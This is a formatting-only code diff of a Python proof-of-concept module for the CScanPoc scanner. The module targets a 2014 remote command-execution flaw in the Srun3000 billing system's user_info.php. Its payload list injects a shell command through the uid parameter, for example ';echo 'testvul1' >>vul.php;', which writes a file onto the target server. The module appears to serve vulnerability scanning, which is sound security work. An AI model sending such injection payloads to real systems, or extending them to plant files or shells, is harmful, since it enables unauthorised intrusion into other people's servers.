@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Srun_0003' # 平台漏洞编号，留空
+    vuln_id = 'Srun_0003'  # 平台漏洞编号，留空
     name = 'Srun3000计费系统 命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2014-03-01'  # 漏洞公布时间
     desc = '''
         Srun3000计费系统 /srun3/web/user_info.php 逻辑不严谨，导致命令执行漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '深澜深澜计费引擎'  # 漏洞应用名称
     product_version = 'Srun3000'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '11974e5a-aecd-4f61-a757-3535b1c87703'
@@ -31,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #ref:http://wooyun.org/bugs/wooyun-2010-052191
+
+            # ref:http://wooyun.org/bugs/wooyun-2010-052191
             hh = hackhttp.hackhttp()
             pocs = [
                 '/user_info.php?uid=;echo+\'testvul1\'+>>vul.php;',
@@ -64,6 +66,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
